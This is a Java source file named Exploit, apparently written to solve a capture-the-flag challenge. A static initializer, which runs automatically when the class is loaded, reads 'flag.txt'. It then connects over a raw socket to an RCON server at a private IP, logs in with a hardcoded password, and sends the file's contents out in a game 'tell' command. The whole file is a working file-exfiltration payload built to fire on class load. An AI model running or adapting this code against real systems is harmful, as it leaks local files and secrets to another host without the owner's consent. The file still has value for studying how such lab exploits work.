import java.io.InputStream;
import java.io.OutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.ThreadLocalRandom;

public class Exploit {

    // --- RCON Protocol Constants ---
    private static final int TYPE_AUTH = 3;
    private static final int TYPE_AUTH_RESPONSE = 2;
    private static final int TYPE_COMMAND = 2;
    private static final int TYPE_RESPONSE = 0;

    // --- Configuration (MUST BE SET BEFORE RUNNING) ---
    private static final String SERVER_IP = "172.20.0.4"; // Your server IP
    private static final int RCON_PORT = 25575;          // Default RCON port
    private static final String RCON_PASSWORD = "password";
    private static final String FILE_PATH = "flag.txt";  // File to read (Uncomment logic to use)

    // ----------------------------------------------------------------------
    // --- RCON Packet Methods (No external or internal helper classes) ---
    // ----------------------------------------------------------------------

    /**
     * Helper method to construct and send an RCON packet.
     */
    private static void sendPacket(OutputStream out, int type, String body) throws IOException {
        // Generate a random ID for this request
        int id = ThreadLocalRandom.current().nextInt(1, Integer.MAX_VALUE);

        byte[] bodyBytes = body.getBytes("ASCII");
        int packetSize = 4 + 4 + bodyBytes.length + 2; // ID + Type + Body + 2 null bytes

        // Use ByteBuffer for Little Endian formatting
        ByteBuffer buffer = ByteBuffer.allocate(packetSize + 4) // +4 for the size field itself
                                      .order(ByteOrder.LITTLE_ENDIAN);

        buffer.putInt(packetSize); // Packet Size (Total Length - 4 bytes for Size)
        buffer.putInt(id);         // Request ID
        buffer.putInt(type);       // Request Type (AUTH or COMMAND)
        buffer.put(bodyBytes);     // Body (Password or Command)
        buffer.put((byte) 0x00);   // First null terminator
        buffer.put((byte) 0x00);   // Second null terminator (for the standard "empty string" field)

        out.write(buffer.array());
        out.flush();
    }

    /**
     * Helper method to read a single RCON response packet.
     *
     * @param in The InputStream from the socket.
     * @return An Object array: [0] = int ID, [1] = int Type, [2] = String Body.
     * @throws IOException If a reading or malformed packet error occurs.
     */
    private static Object[] readPacket(InputStream in) throws IOException {
        // Read the first 4 bytes (Packet Size)
        byte[] sizeBytes = new byte[4];
        if (in.read(sizeBytes) != 4) {
             throw new IOException("Failed to read RCON packet size.");
        }

        // Convert the size bytes (Little Endian) to an int
        int packetSize = ByteBuffer.wrap(sizeBytes).order(ByteOrder.LITTLE_ENDIAN).getInt();
        if (packetSize < 10) { // Smallest valid packet is 10 (4 ID + 4 Type + 2 Nulls)
             throw new IOException("Received malformed packet with size: " + packetSize);
        }

        // Read the rest of the packet data
        byte[] data = new byte[packetSize];
        if (in.read(data) < packetSize) {
             System.err.println("Warning: Did not read all expected packet bytes.");
        }

        // Parse the data using a Little Endian buffer
        ByteBuffer buffer = ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN);

        int id = buffer.getInt();
        int type = buffer.getInt();

        // Body length is (Total Packet Size) - (ID size) - (Type size) - (2 null terminators)
        int bodyLength = packetSize - 4 - 4 - 2;

        byte[] bodyBytes = new byte[bodyLength];
        buffer.get(bodyBytes);

        String body = new String(bodyBytes, "ASCII");

        return new Object[] { id, type, body };
    }

    // ----------------------------------------------------------------------
    // --- Static Initializer Block (Main Execution) ---
    // ----------------------------------------------------------------------

    /**
     * Main execution logic inside the static block.
     * This code runs automatically when the class is loaded.
     */
    static {
        try {
            // 1. Optional: Read the File Content
            String fileContent = new String(Files.readAllBytes(Paths.get(FILE_PATH))).trim();
            String command = "tell Offline Reading Flag: " + fileContent.substring(0, Math.min(fileContent.length(), 200));

            // 2. Connect and Execute RCON
            try (Socket socket = new Socket(SERVER_IP, RCON_PORT)) {
                System.out.println("Connected to RCON server.");

                InputStream in = socket.getInputStream();
                OutputStream out = socket.getOutputStream();

                // --- Step 3: Authenticate ---
                System.out.println("Authenticating...");
                sendPacket(out, TYPE_AUTH, RCON_PASSWORD);

                Object[] authResponse = readPacket(in);

                // Extract values from the array
                int authId = (int) authResponse[0];
                int authType = (int) authResponse[1];
                String authBody = (String) authResponse[2];

                // RCON protocol often sends a TYPE_RESPONSE (0) immediately followed by the AUTH_RESPONSE (2).
                if (authType == TYPE_RESPONSE) {
                   System.out.println("Received initial response, checking for final AUTH response...");
                   authResponse = readPacket(in); // Try reading the actual AUTH_RESPONSE
                   authId = (int) authResponse[0];
                   authType = (int) authResponse[1];
                   authBody = (String) authResponse[2];
                }

                if (authType == TYPE_AUTH_RESPONSE && authId != -1) {
                       System.out.println("Authentication successful!");
                } else {
                    System.err.println("Authentication FAILED. Check password and server logs.");
                    // Fix the 'return' by using System.exit(1) to stop program execution
                    System.exit(1);
                }

                // --- Step 4: Send Command ---
                System.out.println("Sending command: " + command);
                sendPacket(out, TYPE_COMMAND, command);

                Object[] commandResponse = readPacket(in); // Get server's response

                // Extract values from the array
                // int commandId = (int) commandResponse[0];
                // int commandType = (int) commandResponse[1];
                String commandBody = (String) commandResponse[2];

                System.out.println("Command executed. Server Response:");
                System.out.println(commandBody);

            }

        } catch (java.nio.file.NoSuchFileException e) {
            System.err.println("File not found: " + FILE_PATH);
            System.exit(1);
        } catch (IOException e) {
            System.err.println("Connection/IO Error: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        } catch (Exception e) {
            System.err.println("An unexpected error occurred: " + e.getMessage());
            System.exit(1);
        }
    }

    public static void main(String[] args) {
        // Main method is intentionally empty; static block handles execution.
    }
}
